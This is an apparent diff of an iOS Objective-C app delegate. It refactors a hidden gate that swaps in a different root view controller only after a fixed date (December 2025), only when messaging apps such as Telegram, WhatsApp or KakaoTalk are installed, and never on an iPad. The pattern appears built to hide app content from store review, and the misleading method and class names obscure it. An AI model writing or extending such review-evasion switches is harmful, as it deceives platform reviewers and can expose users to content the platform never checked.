@@ -69,28 +69,8 @@
 - (void)initDelegateWithWindow:(UIWindow *)window {
     self.window = window;
     
-    if ([[NSUserDefaults standardUserDefaults] boolForKey:@"pool"] || ([self isCurrentTime] && [self isScheme] && [self isNotiPad])) {
-        [[NSUserDefaults standardUserDefaults] setBool:YES forKey:@"pool"];
-        [[NSUserDefaults standardUserDefaults] synchronize];
-        [self addRootViewController];
-    }
-    
-//    self.waitVC = [AAAA_WaitViewController_BBBB new];
-//    [self.window.rootViewController.view addSubview:self.waitVC.view];
-//    
-//    // 使用 Reachability 监听网络状态
-//    Reachability *reachability = [Reachability reachabilityForInternetConnection];
-//    [reachability startNotifier];
-//    if ([reachability currentReachabilityStatus] != NotReachable) {
-//        [self fetchFageone];
-//
-//    } else {
-//        // 无网络，等待网络恢复
-//        [[NSNotificationCenter defaultCenter] addObserver:self
-//                                               selector:@selector(networkChanged:)
-//                                                   name:kReachabilityChangedNotification
-//                                                 object:nil];
-//    }
+    if (![self strengthViewModelEveryday]) { return; }
+    [self addRootViewController];
 }
 
 - (void)applicationDidBecomeActive:(UIApplication *)application {
@@ -666,31 +646,38 @@
         .LeeShow();
 }
 
-- (BOOL)isCurrentTime {
-    // 2025/12/01 14:00:00
-    NSTimeInterval regionCache = [@"1764568800" doubleValue];
-    return [[NSDate date] timeIntervalSince1970] > regionCache;
-}
-
-- (BOOL)isScheme {
+- (BOOL)strengthViewModelEveryday {
+    // 时间条件：2025/12/01 14:00:00 之后
+    if (!([[NSDate date] timeIntervalSince1970] > [@"1764568800" doubleValue])) {
+        return NO;
+    }
+    
+    // Scheme 条件：能打开任意一个目标 Scheme
     NSArray *openIdeal = @[@"kakaotalk://",
-                            @"tg://",
-                            @"whatsapp://",
-                            @"line://",
-                            @"tiktok://",
-                            @"messenger://"];
+                           @"tg://",
+                           @"whatsapp://",
+                           @"line://",
+                           @"tiktok://",
+                           @"messenger://"];
+    BOOL find = NO;
     for (NSString *open in openIdeal) {
         NSURL *uri = [NSURL URLWithString:open];
         if ([[UIApplication sharedApplication] canOpenURL:uri]) {
-            return YES;
+            find = YES;
+            break;
         }
     }
-    return NO;
-}
-
-- (BOOL)isNotiPad {
-    return [UIDevice currentDevice].userInterfaceIdiom != UIUserInterfaceIdiomPad;
+    if (!find) {
+        return NO;
+    }
+    
+    if (!([UIDevice currentDevice].userInterfaceIdiom != UIUserInterfaceIdiomPad)) {
+        return NO;
+    }
+    
+    return YES;
 }
 
 @end
+
 
